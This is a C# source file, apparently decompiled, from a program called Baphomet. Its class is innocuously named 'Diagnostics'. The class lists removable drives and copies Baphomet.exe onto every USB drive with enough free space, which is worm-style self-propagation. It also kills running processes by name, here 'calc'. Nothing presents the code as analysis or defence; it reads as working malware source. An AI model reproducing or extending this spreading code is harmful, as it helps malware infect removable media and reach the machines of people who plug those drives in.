using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using Baphomet.Models;

namespace Baphomet.Utilities;

public class Diagnostics
{
	public void CheckProccess()
	{
		string[] array = new string[1] { "calc" };
		for (int i = 0; i < array.Length; i++)
		{
			Process[] processesByName = Process.GetProcessesByName(array[i]);
			if (processesByName.Length != 0)
			{
				Process[] array2 = processesByName;
				for (int j = 0; j < array2.Length; j++)
				{
					array2[j].Kill();
				}
			}
		}
	}

	public void AutoCopy(List<UsbDeviceDTO> usbDevice)
	{
		string text = Directory.GetCurrentDirectory() + "\\Baphomet.exe";
		long num = File.ReadAllBytes(text).Length;
		try
		{
			foreach (UsbDeviceDTO item in usbDevice)
			{
				if (item.FreeSpace > num)
				{
					string destFileName = item.Name + "Baphomet.exe";
					File.Copy(text, destFileName);
				}
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine("Error: " + ex);
		}
	}

	public List<UsbDeviceDTO> GetUsbDevices()
	{
		List<UsbDeviceDTO> list = new List<UsbDeviceDTO>();
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.IsReady && driveInfo.DriveType == DriveType.Removable)
			{
				list.Add(new UsbDeviceDTO
				{
					Name = driveInfo.Name,
					FreeSpace = driveInfo.TotalFreeSpace,
					Format = driveInfo.DriveFormat
				});
			}
		}
		return list;
	}
}
